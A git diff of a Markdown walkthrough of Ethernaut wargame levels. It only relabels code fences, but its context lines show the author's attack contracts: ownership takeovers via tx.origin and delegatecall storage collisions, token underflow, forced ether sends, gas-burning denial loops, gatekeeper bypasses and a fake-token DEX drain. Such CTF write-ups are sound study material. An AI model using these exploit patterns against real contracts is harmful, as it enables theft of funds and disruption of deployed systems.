@@ -235,26 +235,26 @@ In this case we can _always_ be right, given that there's 2 factors that generat
 
 1. The variable FACTOR
 
-```cs
+```js
 uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 ```
 
 2. The block hash of the previous block to the coinflip converted to integer
 
-```cs
+```js
 uint256 blockValue = uint256(blockhash(block.number.sub(1)));
 ```
 
 Our coinflip is floor of the ratio between `blockValue` and `FACTOR`
 
-```cs
+```js
 uint256 coinFlip = blockValue.div(FACTOR);
 bool side = coinFlip == 1 ? true : false;
 ```
 
 The problem is then solved by creating an attacker contract that uses the same logic to generate coinflips, but instead to make the guess. Then the guess is plugged into the `flip()` function. 
 
-```cs
+```js
 function callFlip() external {
     uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     uint256 blockVal = uint256(blockhash(block.number - 1));
@@ -331,7 +331,7 @@ Claim ownership of the contract to complete this level.
 
 The function `changeOwner()` compares whether the address that sends the tx (`tx.origin`) is the same as the address that interacts with the contract (`msg.sender`). In this case it isn't, so the owner is changed as per the function's instructions:
 
-```cs
+```js
 function changeOwner(address _owner) public {
     if (tx.origin != msg.sender) {
         owner = _owner;
@@ -345,7 +345,7 @@ Therefore, the only thing needed here is a attacking contract which interacts wi
 
 1. I deployed the contract `TelephoneAttack` (at: `0x756a2E146F4f9659E7c16a90948A09aB09925F19`) which interfaces with the original Telephone contract and calls its `changeOwner()` function as follows:
 
-```cs
+```js
 function callChangeOwner(address _newOwner) external {
     telephoneContract.changeOwner(_newOwner);
 }
@@ -386,7 +386,7 @@ You are given 20 tokens to start with and you will beat the level if you somehow
 
 This contract is using the solidity compiler version 0.6.0, therefore mathematical operations can lead to overflows. In this case, the vulnerability occurs when attempting to call the `transfer()` function:
 
-```cs
+```js
 function transfer(address _to, uint _value) public returns (bool) {
     require(balances[msg.sender] - _value >= 0);
     balances[msg.sender] -= _value;
@@ -399,13 +399,13 @@ The line `require(balances[msg.sender] - _value >= 0);` checks if the user balan
 
 After passing the require statement, there is another mistake where this overflowed value is assigned to the balance of `msg.sender`:
 
-```cs
+```js
 balances[msg.sender] -= _value;
 ```
 
 All we have to do to exploit the contract is call the transfer function as follows:
 
-```cs
+```js
 transfer('any address except the sending address', 21)
 ```
 
@@ -415,7 +415,7 @@ From the address whose funds we want to cause the overflow on.
 
 1. I called the `transfer()` function and sent 21 tokens (1 more than the original 20 to cause an overflow) to the contract address of the Token contract.
 
-```cs
+```js
 token.transfer(EthernautContractAddresses['token'], 21, _from)
 ```
 
@@ -505,7 +505,7 @@ forceattack = ForceAttack.deploy(_from)
 
 And make sure the contract can receive funds and also has a function that calls `selfdestruct()` to the contract address of our instance:
 
-```cs
+```js
 function reload() external payable {}
 
 function forceEtherIntoAddress(address payable _to) external onlyOwner {
@@ -612,7 +612,7 @@ kingattack = KingAttack.deploy(EthernautInstances['king'], _from)
 
 2. Call the `becomeKing()` function, while sending enough funds to take over the contract (1e15 wei = 0.001 ether) defined in the contract as follows:
 
-```cs
+```js
 function becomeKing() external payable {
     (bool success,) = address(kingContract).call{value: msg.value}("");
     require(success, "Transfer failed.");
@@ -709,7 +709,7 @@ The returning value of `isLastFloor()` must be False for `floor` to change and f
 
 1. Create and deploy a Building contract (at: `0x970b299cCB253F5b4f58fEbde41Ffe2D2b25F885`) to interact with the Elevator contract where I define the `isLastFloor()` function:
 
-```cs
+```js
 function isLastFloor(uint256) external returns (bool) {
     lastFloorBool = elevatorContract.floor() == topFloor;
     return lastFloorBool;
@@ -718,7 +718,7 @@ function isLastFloor(uint256) external returns (bool) {
 
 And a function to go to the top floor which calls `goTo()` in the elevator contract:
 
-```cs
+```js
 function goToTopFloor() external {
     elevatorContract.goTo(topFloor);
 }
@@ -761,7 +761,7 @@ In the case of the Privacy contract, we know that the relevant piece of data is 
 
 This contract's state variables are, in order:
 
-```cs
+```js
 bool public locked = true;
 uint256 public ID = block.timestamp;
 uint8 private flattening = 10;
@@ -835,7 +835,7 @@ This contract has 3 modifiers that must be passed in order to make `entrant` the
    
 2. The remaining gas (`gasleft()`) after the code as ran has to be a multiple of 8191. This can be done my performing an external call to the GatekeeperOne contract where we run the `enter()` function and additionally send both the gas needed to perform the instructions *and* a multiple of 8191. I coded it as follows:
 
-```cs
+```js
 (success,) = address(gko).call{
             gas: additionalGas + 10*8191
         }(abi.encodeWithSignature(
@@ -868,7 +868,7 @@ The function takes a parameter `address` and then casts it into `uint64` and the
 
 The second parameter will be a number, it can be a `uint16` as we will deal with small values. This number will be the amount of gas that will be used by instructions in the Gatekeeper One contract call. A multiple of 8191 has to be added to this message call to the amount of additional gas passed through `additionalGas` in order to pass the 2nd check.
 
-```cs
+```js
 function callEnter(address _modifiedTxOrigin, uint16 additionalGas) public returns (bool) {
     // modified tx origin is tx origin with tweaks to pass the require statements in `enter()`
     bytes8 _modifiedTxOriginBytes = bytes8(uint64(_modifiedTxOrigin));
@@ -916,7 +916,7 @@ Block explorer: https://rinkeby.etherscan.io/tx/0x669160ac98274574e76bbe0128e17e
 
 4. Check if we are `entrant`
 
-```cs
+```js
 entrant_assertion = gatekeeper.entrant() == acc.address
 print(f"Address is entrant: {entrant_assertion}")
 ```
@@ -947,13 +947,13 @@ The checks are as follows:
 
 3. The bitwise `XOR` and each element operated through it is its own inverse, so if we have that if:
 
-```cs
+```js
 uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
 ```
 
 Is true, then:
 
-```cs
+```js
 uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey)
 ```
 
@@ -963,7 +963,7 @@ is also true. Therefore, _we don't need `_gateKey`_, we can simply pass the resu
 
 1. Code an attacker contract where we I define the contract constructor as follows:
 
-```cs
+```js
 constructor(address _instance) public {
     bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
 
@@ -1010,13 +1010,13 @@ In two steps:
 
 1. Call `approve()` as follows:
 
-```cs
+```js
 approve(Account2Address, Account1Balance)
 ```
 
 2. Call `transferFrom()` as follows:
 
-```cs
+```js
 transferFrom(Account1Address, Account2Address, Account1Balance)
 ```
 
@@ -1076,7 +1076,7 @@ When we modify the variable `storedTime` through a `delegatecall` of the `setTim
 
 Therefore, calling either `setFirstTime()` or `setSecondTime()` will modify `timeZone1Library` with whatever value we pass as `_timeStamp`. Therefore, in order to exploit the contract and become `owner`, we need to deploy a contract with the _same storage layout as Preservation_, this means that our attacker contract should define:
 
-```cs
+```js
 address public timeZone1Library;
 address public timeZone2Library;
 address public owner; 
@@ -1088,7 +1088,7 @@ Also, there must be two additional functions defined in the attacker contract:
 
 * A function `setTime()` that takes a `uint256` parameter, which will, in the case of the attacker contract, modify the variable in its _3rd memory slot_, so `owner`. The name of this variable is not relevant, since we're only interested in modifying the 3rd memory slot in Preservation, but for consistency's purposes, I also named it `owner`.
 
-```cs
+```js
 function setTime(uint256) public {
     owner = tx.origin;
 }
@@ -1096,7 +1096,7 @@ function setTime(uint256) public {
 
 * A function where `setFirstTime()` is called in Preservation in order to make `timeZone1Library` the attacker contract. If each LibraryContract was _correctly coded_ with an identical layout to Preservation, the Preservation contract wouldn't be vulnerable in this way.
 
-```cs
+```js
 function setFirstTimeExploit() external {
     preservationContract.setFirstTime(uint256(address(this)));
 }
@@ -1287,7 +1287,7 @@ There are probably more ways, but I'm not familiar with them.
 
 The contract looks like this (It's under `/contracts/attacks/MagicNumberSolver.Yul` in the repo):
 
-```cs
+```js
 // SPDX-License-Identifier: MIT
 object "MagicNumberSolver" {
     code {
@@ -1308,7 +1308,7 @@ This is a _million times_ more readable than raw bytecode or even raw opcodes, t
 
 This is the constructor of the contract (initialization opcodes), usually declared with `constructor()` in Solidity:
 
-```cs
+```js
 code {
     sstore(0, caller())
     datacopy(0, dataoffset("Runtime"), datasize("Runtime"))
@@ -1449,7 +1449,7 @@ If a specific amount to spend had been set, execution would not halt and the `tr
 
 1. I coded and deployed (at: `0x5708A3c4d9472B9D6951200c6d6C2FB82ef96c50`) an attacker contract with a `receive()` fallback function defined as follows:
 
-```cs
+```js
 receive() external payable {
     while (true) {
         foreverLooping += 1;
@@ -1460,7 +1460,7 @@ receive() external payable {
 
 Where `foreverLooping` is a state variable:
 
-```cs
+```js
 uint256 private foreverLooping;
 ```
 
@@ -1473,7 +1473,7 @@ denialattack = DenialAttack.deploy(denial.address, _from)
 
 2. I made the contract `partner` through a function inside the contract I defined which calls `setWithdrawPartner()` in Denial through an interface:
 
-```cs
+```js
 function setThisAsWithdrawPartner() public {
     denialContract.setWithdrawPartner(address(this));
 }
@@ -1531,7 +1531,7 @@ All we have to do is make sure the function `price()` returns 100 when `isSold` 
 
 1. Code and deploy a Buyer contract (at: `0xB9dcacbc393D15fEa292705d66c1549035CcB3ee`) where I define the `price()` function as follows:
 
-```cs
+```js
 function price() public view returns (uint256) {
     if (shopContract.isSold()) {
         return 1;
@@ -1721,7 +1721,7 @@ You need to drain all balances of token1 and token2 from the DexTwo contract to 
 
 The DexTwo problem suffers from a different problem to the Dex problem. In this case, there is no require statement checking whether the two token contract addresses being swapped actually match the two token contract addresses for which the pool is designed. As correctly defined in the Dex contract, this line is missing:
 
-```cs
+```js
 require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
 ```
 
@@ -1950,7 +1950,7 @@ Block explorer: https://rinkeby.etherscan.io/tx/0x79c0e38730d584e33f5e291452c09a
 
 3. Deploy a BombEngine contract (at: `0x89a05702875f0c18FF5B28640ea3DdE39FDe6E47`) with only a single function that can self destruct such contract
 
-```cs
+```js
 function boom() public {
     selfdestruct(address(0));
 }
@@ -2048,7 +2048,7 @@ forta = Forta.at(dep.forta())
 
 That said, I coded the `handleTransaction()` function as follows:
 
-```cs
+```js
 function handleTransaction(address user, bytes calldata) public override {
     uint dataValue;
     uint calldataloadPos = 4;
